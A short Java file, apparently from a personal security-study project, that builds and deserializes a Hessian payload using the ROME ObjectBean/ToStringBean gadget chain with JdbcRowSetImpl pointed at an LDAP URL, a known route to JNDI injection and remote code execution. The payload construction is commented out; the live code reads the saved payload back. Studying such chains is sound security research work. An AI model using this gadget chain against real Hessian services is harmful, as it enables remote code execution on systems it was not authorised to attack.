package org.dili.hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.HashMap;

public class RomeHessian {
    public static void main(String[] args) throws Exception{
        // // ldap url
        // String url = "ldap://127.0.0.1:1389/czhupn";
        //
        // // 创建JdbcRowSetImpl对象
        // JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        // jdbcRowSet.setDataSourceName(url);
        //
        // // 创建toStringBean对象
        // ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
        //
        // // 创建ObjectBean
        // ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        //
        // // 创建HashMap
        // HashMap<Object, Object> hashMap = new HashMap<>();
        // hashMap.put(objectBean, "aaaa");
        //
        // // 序列化
        // FileOutputStream fileOutputStream = new FileOutputStream("JavaSec/out/RomeHessian.bin");
        // Hessian2Output hessian2Output = new Hessian2Output(fileOutputStream);
        // hessian2Output.writeObject(hashMap);
        // hessian2Output.close();

        // 反序列化
        FileInputStream fileInputStream = new FileInputStream("JavaSec/out/RomeHessian.bin");
        Hessian2Input hessian2Input = new Hessian2Input(fileInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();

    }

    // public static void setFiled(Object o, String fieldname, Object value) throws Exception {
    //     Field field = o.getClass().getDeclaredField(fieldname);
    //     field.setAccessible(true);
    //     field.set(o, value);
    // }
}
